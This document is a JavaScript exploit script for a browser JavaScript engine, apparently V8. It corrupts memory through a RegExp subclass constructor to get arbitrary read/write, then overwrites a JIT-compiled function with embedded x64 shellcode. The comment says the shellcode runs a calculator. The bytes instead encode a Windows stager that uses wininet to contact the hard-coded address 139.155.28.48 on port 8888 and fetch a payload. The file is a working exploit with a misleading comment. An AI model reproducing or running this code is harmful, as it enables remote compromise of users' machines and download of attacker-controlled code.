ENABLE_LOG = true;
IN_WORKER = true;

// run calc and hang in a loop
var shellcode = [ 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x75,0x72,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4f,0xff,0xff,0xff,0x5d,0x6a,0x00,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x49,0x89,0xe6,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x48,0x31,0xc9,0x48,0x31,0xd2,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x41,0x50,0x41,0x50,0x41,0xba,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xeb,0x73,0x5a,0x48,0x89,0xc1,0x41,0xb8,0xb8,0x22,0x00,0x00,0x4d,0x31,0xc9,0x41,0x51,0x41,0x51,0x6a,0x03,0x41,0x51,0x41,0xba,0x57,0x89,0x9f,0xc6,0xff,0xd5,0xeb,0x59,0x5b,0x48,0x89,0xc1,0x48,0x31,0xd2,0x49,0x89,0xd8,0x4d,0x31,0xc9,0x52,0x68,0x00,0x02,0x40,0x84,0x52,0x52,0x41,0xba,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x48,0x83,0xc3,0x50,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0xff,0xff,0xff,0xff,0x4d,0x31,0xc9,0x52,0x52,0x41,0xba,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x0f,0x85,0x9d,0x01,0x00,0x00,0x48,0xff,0xcf,0x0f,0x84,0x8c,0x01,0x00,0x00,0xeb,0xd3,0xe9,0xe4,0x01,0x00,0x00,0xe8,0xa2,0xff,0xff,0xff,0x2f,0x77,0x39,0x77,0x36,0x00,0x26,0xbb,0xcc,0xa2,0x3c,0x31,0xad,0xe3,0xb1,0xa3,0xb9,0x14,0xe6,0x10,0x1c,0xb8,0x06,0x0e,0xea,0x62,0xd0,0x8f,0x45,0x96,0xf2,0xd7,0x50,0xb8,0xa4,0x65,0xe2,0x31,0x63,0xf3,0x8e,0x13,0x62,0xc6,0x40,0xfe,0xd0,0x1b,0x15,0x85,0x2a,0x12,0xbe,0x6c,0x51,0xfe,0x45,0x59,0x5d,0xca,0x63,0xb3,0x15,0x40,0x93,0xe8,0x9f,0xb7,0xc4,0x94,0xee,0x2d,0xe7,0xf9,0xdc,0xbf,0x88,0x99,0x62,0x00,0x55,0x73,0x65,0x72,0x2d,0x41,0x67,0x65,0x6e,0x74,0x3a,0x20,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x0d,0x0a,0x00,0x6f,0x19,0x13,0x30,0xab,0xf4,0x6c,0x77,0xe0,0x77,0xcc,0xfb,0x15,0x7e,0xfb,0xb3,0x51,0x25,0x40,0x37,0xcb,0x8a,0x09,0xce,0x9b,0xe2,0x56,0x3d,0xe0,0x84,0xf8,0x47,0xa2,0x6a,0x4f,0xe1,0x93,0xb0,0x6b,0x1b,0xd3,0xb1,0x29,0x4b,0x88,0xcc,0x9c,0x65,0x9b,0xe7,0x2a,0xac,0xae,0x56,0x81,0x2b,0xcf,0x7c,0xee,0xe2,0x36,0x89,0x80,0x23,0xb4,0xcd,0x8c,0xf4,0x20,0xba,0x40,0x9f,0x58,0x3e,0xd5,0x65,0x9e,0x78,0x3d,0xb0,0xe8,0x3f,0x4c,0x77,0x27,0x6a,0xb9,0x4d,0x00,0x30,0xdd,0x48,0x93,0xc7,0x35,0xa7,0x2d,0x83,0x3c,0x87,0x66,0xc0,0x05,0x10,0xbb,0xb2,0xc0,0x2e,0x12,0x3d,0x92,0x1d,0xa4,0x11,0x5c,0xd5,0x43,0x32,0x01,0x44,0x62,0x12,0x7f,0x7a,0x50,0x0b,0x01,0x22,0x7b,0x5a,0xa5,0x3a,0x48,0x6e,0xab,0x81,0x17,0xc4,0x26,0xe7,0x24,0x6a,0x03,0xf2,0x2b,0x05,0x5d,0x76,0x55,0x7c,0x71,0x7a,0x77,0xc5,0x8d,0x33,0x8d,0xa1,0xa7,0xc2,0xe5,0xb7,0x81,0xbf,0x80,0x87,0x56,0xed,0x3d,0xcc,0x80,0x21,0x0a,0xcf,0x55,0x19,0x16,0x59,0xf5,0xb5,0xdc,0x3f,0x9d,0xc2,0x04,0x54,0xab,0x39,0xa0,0x6f,0x9c,0x76,0x06,0xbe,0x4b,0xd4,0x2e,0xdb,0x21,0x01,0x91,0x75,0x90,0xa3,0xa8,0x92,0x8b,0xf7,0x42,0xdf,0x88,0xda,0x06,0x4c,0x35,0xf7,0x16,0xc0,0xaa,0xe5,0xea,0x9b,0x37,0x60,0xa2,0x3e,0x84,0x00,0x41,0xbe,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x31,0xc9,0xba,0x00,0x00,0x40,0x00,0x41,0xb8,0x00,0x10,0x00,0x00,0x41,0xb9,0x40,0x00,0x00,0x00,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x41,0xb8,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x41,0xba,0x12,0x96,0x89,0xe2,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb6,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd7,0x58,0x58,0x58,0x48,0x05,0x00,0x00,0x00,0x00,0x50,0xc3,0xe8,0x9f,0xfd,0xff,0xff,0x31,0x33,0x39,0x2e,0x31,0x35,0x35,0x2e,0x32,0x38,0x2e,0x34,0x38,0x00,0x51,0x09,0xbf,0x6d];

function print(data) {
}

var not_optimised_out = 0;
var target_function = (function (value) {
    if (value == 0xdecaf0) {
        not_optimised_out += 1;
    }
    not_optimised_out += 1;
    not_optimised_out |= 0xff;
    not_optimised_out *= 12;
});

for (var i = 0; i < 0x10000; ++i) {
    target_function(i);
}

var g_array;
var tDerivedNCount = 17 * 87481 - 8;
var tDerivedNDepth = 19 * 19;

function cb(flag) {
    if (flag == true) {
        return;
    }
    g_array = new Array(0);
    g_array[0] = 0x1dbabe * 2;
    return 'c01db33f';
}

function gc() {
    for (var i = 0; i < 0x10000; ++i) {
        new String();
    }
}

function oobAccess() {
    var this_ = this;
    this.buffer = null;
    this.buffer_view = null;

    this.page_buffer = null;
    this.page_view = null;

    this.prevent_opt = [];

    var kSlotOffset = 0x1f;
    var kBackingStoreOffset = 0xf;

    class LeakArrayBuffer extends ArrayBuffer {
        constructor() {
            super(0x1000);
            this.slot = this;
        }
    }

    this.page_buffer = new LeakArrayBuffer();
    this.page_view = new DataView(this.page_buffer);

    new RegExp({ toString: function () { return 'a' } });
    cb(true);

    class DerivedBase extends RegExp {
        constructor() {
            // var array = null;
            super(
                // at this point, the 4-byte allocation for the JSRegExp `this` object
                // has just happened.
                {
                    toString: cb
                }, 'g'
                // now the runtime JSRegExp constructor is called, corrupting the
                // JSArray.
            );

            // this allocation will now directly follow the FixedArray allocation
            // made for `this.data`, which is where `array.elements` points to.
            this_.buffer = new ArrayBuffer(0x80);
            g_array[8] = this_.page_buffer;
        }
    }

    // try{
    var derived_n = eval(`(function derived_n(i) {
        if (i == 0) {
            return DerivedBase;
        }

        class DerivedN extends derived_n(i-1) {
            constructor() {
                super();
                return;
                ${"this.a=0;".repeat(tDerivedNCount)}
            }
        }

        return DerivedN;
    })`);

    gc();

    new (derived_n(tDerivedNDepth))();

    this.buffer_view = new DataView(this.buffer);
    this.leakPtr = function (obj) {
        this.page_buffer.slot = obj;
        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);
    }

    this.setPtr = function (addr) {
        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);
    }

    this.read32 = function (addr) {
        this.setPtr(addr);
        return this.page_view.getUint32(0, true, ...this.prevent_opt);
    }

    this.write32 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint32(0, value, true, ...this.prevent_opt);
    }

    this.write8 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint8(0, value, ...this.prevent_opt);
    }

    this.setBytes = function (addr, content) {
        for (var i = 0; i < content.length; i++) {
            this.write8(addr + i, content[i]);
        }
    }
    return this;
}

function trigger() {
    var oob = oobAccess();

    var func_ptr = oob.leakPtr(target_function);
    print('[*] target_function at 0x' + func_ptr.toString(16));

    var kCodeInsOffset = 0x1b;

    var code_addr = oob.read32(func_ptr + kCodeInsOffset);
    print('[*] code_addr at 0x' + code_addr.toString(16));

    oob.setBytes(code_addr, shellcode);

    target_function(0);
}

try{
    print("start running");
    trigger();
}catch(e){
    print(e);
}
